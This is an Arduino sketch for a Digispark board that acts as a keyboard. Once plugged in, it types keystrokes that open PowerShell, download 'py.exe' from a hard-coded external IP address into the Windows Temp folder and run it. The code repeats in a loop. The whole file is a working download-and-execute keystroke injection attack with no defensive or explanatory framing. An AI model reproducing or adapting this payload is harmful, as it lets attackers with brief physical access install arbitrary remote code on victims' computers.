#include "DigiKeyboard.h"
#define KEY_KPAD_MINUS        0x56     // Keypad -
#define KEY_KPAD_EQUAL        0x67     // Keypad =
#define KEY_INTL_BACKSLASH    0x64     // Keyboard Non-US \ and 
#define KEY_DOT               0x37     // .

//#define KEY_4                 0x24     // Keyboard $ and 4
void setup() {
  // don't need to set anything up to use DigiKeyboard
}

void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_M, MOD_GUI_LEFT); 
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  //$client = new-object System.Net.WebClient
  DigiKeyboard.sendKeyStroke(KEY_4, MOD_SHIFT_LEFT);
  DigiKeyboard.print("client ");
  DigiKeyboard.sendKeyStroke(KEY_0, MOD_SHIFT_LEFT);
  DigiKeyboard.print(" new");
  DigiKeyboard.sendKeyStroke(KEY_KPAD_MINUS);
  DigiKeyboard.print("object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  //$client.DownloadFile(http://159.234.148.251/py.exe,C:\windows\Temp\py.exe)
  DigiKeyboard.sendKeyStroke(KEY_4, MOD_SHIFT_LEFT);
  DigiKeyboard.print("client.DownloadFile");
  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.print("http");
  DigiKeyboard.sendKeyStroke(KEY_DOT, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("159.234.148.251");
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("py.exe");
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.print(",");
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.print("c");
  DigiKeyboard.sendKeyStroke(KEY_DOT, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("Windows");
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("Temp");
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("py.exe");
  DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //Lo ejecuto
  DigiKeyboard.print("c");
  DigiKeyboard.sendKeyStroke(KEY_DOT, MOD_SHIFT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("Windows");
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("Temp");
  DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
  DigiKeyboard.print("py.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
